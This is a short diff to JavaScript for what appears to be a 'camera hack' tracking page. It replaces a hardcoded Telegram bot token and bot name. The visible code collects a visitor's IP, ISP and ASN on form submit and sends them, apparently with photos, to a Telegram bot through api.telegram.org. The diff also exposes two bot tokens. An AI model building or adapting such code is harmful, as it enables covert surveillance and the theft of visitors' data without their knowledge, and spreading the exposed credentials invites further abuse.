@@ -1,4 +1,4 @@
-const BOT_TOKEN = "7677946069:AAE_PStZOFTKUtEVwmXljxXH2ZYkQ0zb80o"; // Replace with your bot token
+const BOT_TOKEN = "8489125956:AAGYLINGLgRRwgv3DSor7-7VQH9-nUJ3Q3I"; // Replace with your bot token
 const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
@@ -152,7 +152,7 @@ document.getElementById('data-form').addEventListener('submit', async function (
 <b>📡 ISP:</b> <i>${ipDetails.org}</i>
 <b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
 
-<b>👨‍💻 Tracked on: @Ind_AI_RoBot
+<b>👨‍💻 Tracked on: @Aditya_Camera_Hack_10BOT
 `;
 
     await sendTelegramMessage(chatId, message);
